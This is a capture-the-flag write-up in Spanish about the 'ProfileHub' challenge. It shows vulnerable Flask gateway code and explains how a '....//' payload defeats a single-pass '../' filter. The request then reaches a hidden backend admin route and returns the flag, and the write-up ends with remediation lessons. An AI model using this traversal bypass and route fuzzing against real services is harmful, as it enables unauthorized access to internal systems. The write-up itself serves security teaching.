ProfileHub is a microservice employee directory. A public gateway sits in front of an internal backend and forwards along the requests it likes.

```json
{"profile":{"bio":"Backend developer focused on distributed systems.","department":"Engineering","display_name":"Alice Chen","joined":"2023-04-12","role":"developer","username":"alice"},"status":"ok"}


{"profile":{"bio":"UI/UX designer with a passion for accessibility.","department":"Product","display_name":"Bob Martinez","joined":"2022-11-03","role":"designer","username":"bob"},"status":"ok"}


{"profile":{"bio":"Engineering manager. Previously at Stripe and AWS.","department":"Engineering","display_name":"Carol Yun","joined":"2021-08-19","role":"manager","username":"carol"},"status":"ok"}



{"profile":{"bio":"Application security engineer and CTF enthusiast.","department":"Security","display_name":"Dave Okonkwo","joined":"2024-01-08","role":"developer","username":"dave"},"status":"ok"}
```



![[Pasted image 20260704122656.png]]


`## 🎯 El reto

ProfileHub es un directorio de empleados basado en microservicios. Un **gateway público** recibe las peticiones y las reenvía a un **backend interno** que no es accesible directamente desde fuera.

```
Cliente → Gateway (público, puerto 8080) → Backend interno (puerto 5001)
```

Código del gateway (relevante):

```python
def sanitize_path(user_input):
    """Neutralize path traversal sequences in user input."""
    cleaned = user_input.replace("../", "")
    cleaned = cleaned.replace("..\\", "")
    return cleaned

@app.route("/api/profile/<path:username>")
def get_profile(username):
    safe_username = sanitize_path(username)
    internal_url = f"{BACKEND_URL}/users/{safe_username}"
    resp = http_client.get(internal_url, timeout=5)
    ...
```

Endpoints públicos documentados: `/api/users`, `/api/profile/<username>`, `/health`.

## 🔍 Reconocimiento

|Endpoint|Resultado|
|---|---|
|`GET /api/users`|`{"users":["alice","bob","carol","dave"]}`|
|`GET /api/profile/dave`|Perfil normal de Dave|
|`GET /health`|`{"status":"healthy"}` (del gateway, no del backend)|

Los perfiles solo muestran campos "públicos" (bio, departamento, nombre, rol) — nada de datos internos. La pista del enunciado: _"un gateway público reenvía las peticiones que le gustan"_ → sugiere que el backend interno tiene más rutas de las que el gateway expone.

## 🐛 La vulnerabilidad: sanitización de un solo paso (bypass clásico)

`sanitize_path()` hace **una sola pasada** de `.replace("../", "")`. No repite la limpieza sobre el resultado, así que un patrón bien armado sobrevive:

```
Input:  "....//admin/flag"
```

Python busca `"../"` una vez, sin solaparse:

- En `....//` encuentra la coincidencia en la posición 2-4 (`..` + `/`) y la borra.
- Lo que queda es el resto: `..` + `/` = **`../`**

Es decir:

```python
"....//admin/flag".replace("../", "") == "../admin/flag"
```

La "limpieza" deja pasar exactamente lo que se supone que debía bloquear.

## 🎯 Por qué esto compromete al backend

La URL interna se arma por concatenación simple:

```python
internal_url = f"{BACKEND_URL}/users/{safe_username}"
# con safe_username = "../admin/flag"
# → http://backend:5001/users/../admin/flag
```

Cuando el cliente HTTP interno (o el servidor del backend) normaliza la ruta, `/users/../admin/flag` se colapsa a:

```
http://backend:5001/admin/flag
```

Es decir: **escapamos por completo del prefijo `/users/`** y llegamos a un endpoint interno que el gateway nunca pensó exponer al público.

## 🧪 Proceso de explotación

1. **Confirmar que el bypass escapa la raíz.** Se probó `....//health` contra `/api/profile/`, esperando que devolviera lo mismo que el `/health` público si el traversal realmente escapaba del backend:
    
    ```
    GET /api/profile/....//health  -> {"status":"healthy"}   ✅ funciona
    GET /api/profile/....//users   -> {"users":[...]}         ✅ funciona
    ```
    
    Esto confirmó el escape antes de gastar tiempo buscando rutas secretas.
    
2. **Fuzzing de rutas internas.** Con el bypass confirmado, se automatizó con Python una lista de nombres típicos de rutas internas/admin: `admin`, `internal`, `debug`, `flag`, `config`, `hr`, `payroll`, etc. — tanto planas (`....//admin`) como anidadas (`....//admin/flag`, `....//internal/users`, etc.).
    
3. **Hit:**
    
    ```
    GET /api/profile/....//admin/flag
    -> {"flag":"flag{5a9e36bbcb3e1434}","message":"Internal admin access granted","status":"ok"}
    ```
    
    `admin/flag` era una ruta interna real del backend, solo protegida por el hecho de no estar expuesta por el gateway — y el gateway dejaba pasar el traversal.
    

## 🧠 Lección de seguridad

- **Nunca sanitizar con un `.replace()` de una sola pasada.** Si el patrón peligroso puede reconstruirse tras eliminar una ocurrencia (`....//` → `../`), la limpieza es inútil. La forma correcta es aplicar la limpieza en bucle hasta que el resultado ya no cambie, o mejor aún, usar `os.path.normpath()` + verificar que la ruta resultante siga dentro del directorio/prefijo esperado (allow-list), en vez de intentar "quitar" patrones peligrosos (block-list).
- **Un gateway no debería confiar en que "solo expone" ciertas rutas** si el backend interno tiene otras rutas sensibles sin autenticación propia — la seguridad por oscuridad de red no sustituye el control de acceso real en el propio backend.

## 🧰 Herramientas usadas

- Lectura de código fuente del gateway (Flask) para identificar la sanitización defectuosa.
- `requests` en Python para automatizar pruebas de bypass y fuzzing de rutas candidatas.
- Petición de control (`....//health`, `....//users`) antes de fuzzing a ciegas, para confirmar el bypass con el mínimo esfuerzo.